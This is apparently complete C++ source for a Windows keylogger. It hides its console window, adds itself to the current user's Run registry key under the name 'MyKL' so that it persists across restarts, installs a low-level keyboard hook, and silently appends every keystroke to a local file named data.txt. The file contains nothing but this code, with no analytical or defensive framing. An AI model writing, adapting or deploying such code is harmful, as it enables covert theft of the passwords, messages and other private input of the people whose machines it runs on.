#include <windows.h>
#include <fstream>
#include <Shlwapi.h>
#include <thread>
#include <sstream>

#pragma comment(lib, "Shlwapi.lib")

void SetWorkingDirectory() {
    wchar_t exePath[MAX_PATH];
    GetModuleFileName(NULL, exePath, MAX_PATH);
    PathRemoveFileSpecW(exePath);
    SetCurrentDirectory(exePath);
}

std::string IntToString(int value) {
    std::stringstream ss;
    ss << value;
    return ss.str();
}

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    static DWORD lastVKCode = 0;
    static DWORD lastTime = 0;

    if (nCode == HC_ACTION) {
        KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;
        DWORD vkCode = p->vkCode;
        DWORD currentTime = GetTickCount();

        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            if (vkCode != lastVKCode || (currentTime - lastTime) > 50) { 
                std::ofstream logFile;
                logFile.open("data.txt", std::ios_base::app);

                // Translate the virtual key code to a character
                BYTE keyboardState[256];
                GetKeyboardState(keyboardState);
                WCHAR buffer[2];
                if (ToUnicode(vkCode, p->scanCode, keyboardState, buffer, 2, 0) == 1) {
                    char key = (char)buffer[0];
                    logFile << key;
                }

                logFile.close();

                lastVKCode = vkCode;
                lastTime = currentTime;
            }
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int WINAPI WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPSTR lpCmdLine, _In_ int nCmdShow) {
    // Hide console window
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    // Set the correct working directory
    SetWorkingDirectory();

    // Wait for a few seconds to ensure all services are up and running
    std::this_thread::sleep_for(std::chrono::seconds(10));

    // Install program to run at system startup
    HKEY hKey;
    const wchar_t* path = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    const wchar_t* value = L"MyKL";
    if (RegOpenKey(HKEY_CURRENT_USER, path, &hKey) == ERROR_SUCCESS) {
        wchar_t exePath[MAX_PATH];
        GetModuleFileName(NULL, exePath, MAX_PATH);
        RegSetValueEx(hKey, value, 0, REG_SZ, (BYTE*)exePath, static_cast<DWORD>((wcslen(exePath) + 1) * sizeof(wchar_t)));
        RegCloseKey(hKey);
    }

    // Set up keyboard hook
    HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0);
    if (!hook) {
        MessageBox(NULL, L"Failed to install hook!", L"Error", MB_ICONERROR);
        return 1;
    }

    // Message loop
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // Unhook
    UnhookWindowsHookEx(hook);

    return 0;
}
